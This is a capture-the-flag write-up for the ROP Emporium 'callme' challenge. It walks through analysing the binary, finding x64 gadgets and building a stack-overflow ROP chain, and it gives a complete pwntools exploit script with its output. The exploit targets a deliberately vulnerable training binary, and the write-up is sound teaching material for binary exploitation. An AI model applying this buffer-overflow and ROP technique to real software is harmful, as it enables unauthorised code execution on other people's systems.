---
title: ROP Emporium - callme Challenge Writeup
tags: [pwn, rop, binary exploitation, x64]
style: border
color: warning
description: Writeup for the callme challenge from ROP Emporium - calling multiple functions with multiple arguments in a ROP chain.
---

## Challenge Overview

The **callme** challenge escalates the complexity by requiring us to call three different functions in sequence, each with three arguments. This tests our ability to build longer ROP chains and manage multiple function calls.

**Challenge Link**: [ROP Emporium - callme](https://ropemporium.com/challenge/callme.html)

## Challenge Requirements

To solve this challenge, we must call three functions in order:
1. `callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)`
2. `callme_two(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)`
3. `callme_three(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)`

Each function must be called with the same three specific arguments in the correct order.

## Binary Analysis

### Initial Reconnaissance

```bash
$ file callme
callme: ELF 64-bit LSB executable, x86-64

$ checksec callme
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

$ ldd callme
    libcallme.so => ./libcallme.so
    libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6
```

The binary links against a shared library `libcallme.so` which contains the three callme functions.

### Static Analysis

```bash
$ ./callme
callme by ROP Emporium
x86_64

Hope you read the instructions...
> test
Thank you!
Exiting
```

### Finding Function Addresses

```bash
$ r2 callme
[0x00400720]> aaa
[0x00400720]> afl | grep callme
0x00400720    1 6            sym.imp.callme_three
0x00400740    1 6            sym.imp.callme_one
0x00400750    1 6            sym.imp.callme_two
```

Addresses (PLT entries):
- `callme_one@plt`: `0x400740`
- `callme_two@plt`: `0x400750`
- `callme_three@plt`: `0x400720`

Note: The addresses shown by r2 may differ slightly from the actual PLT entries used in the exploit. Always verify addresses in your specific binary.

## x64 Multi-Argument Calling Convention

For three arguments in x64:
- 1st argument → RDI
- 2nd argument → RSI
- 3rd argument → RDX

We need gadgets to control all three registers.

### Finding ROP Gadgets

```bash
$ ROPgadget --binary callme | grep "pop rdi"
0x00000000004009a3 : pop rdi ; ret

$ ROPgadget --binary callme | grep "pop rsi"
0x000000000040093d : pop rsi ; pop rdx ; ret
```

We found two gadgets that together give us control over all three argument registers:
- `pop rdi; ret` at `0x4009a3` - controls RDI (first argument)
- `pop rsi; pop rdx; ret` at `0x40093d` - controls RSI and RDX (second and third arguments)

While a single `pop rdi; pop rsi; pop rdx; ret` gadget would be more efficient, using two separate gadgets works just as well and demonstrates gadget chaining

## Exploitation Strategy

Build a ROP chain that:
1. Sets up arguments (RDI, RSI, RDX) for `callme_one`
2. Calls `callme_one`
3. Sets up arguments for `callme_two`
4. Calls `callme_two`
5. Sets up arguments for `callme_three`
6. Calls `callme_three`

The ROP chain structure (using separate gadgets):
```
[padding]
[pop rdi; ret]
[0xdeadbeefdeadbeef]  # arg1 -> RDI
[pop rsi; pop rdx; ret]
[0xcafebabecafebabe]  # arg2 -> RSI
[0xd00df00dd00df00d]  # arg3 -> RDX
[callme_one@plt]
[pop rdi; ret]
[0xdeadbeefdeadbeef]  # arg1 -> RDI
[pop rsi; pop rdx; ret]
[0xcafebabecafebabe]  # arg2 -> RSI
[0xd00df00dd00df00d]  # arg3 -> RDX
[callme_two@plt]
[pop rdi; ret]
[0xdeadbeefdeadbeef]  # arg1 -> RDI
[pop rsi; pop rdx; ret]
[0xcafebabecafebabe]  # arg2 -> RSI
[0xd00df00dd00df00d]  # arg3 -> RDX
[callme_three@plt]
```

## Exploit Code

```python
#!/usr/bin/env python3
from pwn import *
import sys

elf = ELF("./callme")
libc = ELF("./libcallme.so")
context.binary = elf
binary = elf.path
context.log_level = "debug"
IP, PORT = "address", 1337

global io
breakpoints = '''
'''

if len(sys.argv) > 1 and sys.argv[1] == "-ng":
    io = process(binary, env = {"LD_PRELOAD": "./libcallme.so"})
elif len(sys.argv) > 1 and sys.argv[1] == "-r":
    io = remote(IP, PORT)
else:
    io = process(binary, env = {"LD_PRELOAD": "./libcallme.so"})
    gdb.attach(io, breakpoints)

sl = lambda a: io.sendline(a)
sla = lambda a, b: io.sendlineafter(a, b)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline(False)
def main(io):
    # Addresses from the binary
    one_plt = 0x400740      # callme_one@plt
    two_plt = 0x400750      # callme_two@plt  
    three_plt = 0x400720    # callme_three@plt
    pop_rdi = 0x00000000004009a3
    pop_rsi = 0x000000000040093d       # pop rsi; pop rdx; ret

    payload = b'a' * 32
    payload += b'b' * 8         # rbp
    payload += p64(pop_rdi)
    payload += p64(0xdeadbeefdeadbeef)
    payload += p64(pop_rsi)
    payload += p64(0xcafebabecafebabe)
    payload += p64(0xd00df00dd00df00d)
    payload += p64(one_plt)

    payload += p64(pop_rdi)
    payload += p64(0xdeadbeefdeadbeef)
    payload += p64(pop_rsi)
    payload += p64(0xcafebabecafebabe)
    payload += p64(0xd00df00dd00df00d)
    payload += p64(two_plt)

    payload += p64(pop_rdi)
    payload += p64(0xdeadbeefdeadbeef)
    payload += p64(pop_rsi)
    payload += p64(0xcafebabecafebabe)
    payload += p64(0xd00df00dd00df00d)
    payload += p64(three_plt)

    sla('> ', payload)

    io.interactive()

if __name__ == "__main__":
    main(io)
```

## Running the Exploit

```bash
$ python3 exploit_callme.py
[*] '/path/to/callme'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/path/to/callme': pid 12345
[*] Receiving all data
[*] Process '/path/to/callme' stopped with exit code 0 (pid 12345)

Thank you!
callme_one() called correctly
callme_two() called correctly
callme_three() called correctly
ROPE{a_placeholder_32byte_flag!}
```

## Debugging Tips

If the exploit doesn't work immediately:

1. **Verify gadget address**: Use `ROPgadget` or `ropper` to confirm
2. **Check argument order**: Ensure RDI, RSI, RDX are in the correct order
3. **Test incrementally**: Build the chain one function call at a time
4. **Use GDB**: Set breakpoints and inspect registers before each function call

```bash
$ gdb ./callme
gdb> break callme_one
gdb> break callme_two
gdb> break callme_three
gdb> run < <(python3 exploit_callme.py)
gdb> info registers rdi rsi rdx
```

## Key Takeaways

1. **Multi-Argument Functions**: Setting up multiple registers for function calls
2. **Chaining Multiple Calls**: Building longer ROP chains with multiple function calls
3. **Gadget Reuse**: Using the same gadget multiple times in a chain
4. **Shared Libraries**: Working with functions from dynamically linked libraries
5. **PLT/GOT Mechanism**: Understanding how external functions are called

This challenge demonstrates that ROP chains can be extended to perform complex sequences of operations by carefully managing registers and return addresses.

---

**Challenge Completed**: ✓  
**Previous Challenge**: [split](https://ropemporium.com/challenge/split.html)  
**Next Challenge**: [write4](https://ropemporium.com/challenge/write4.html)
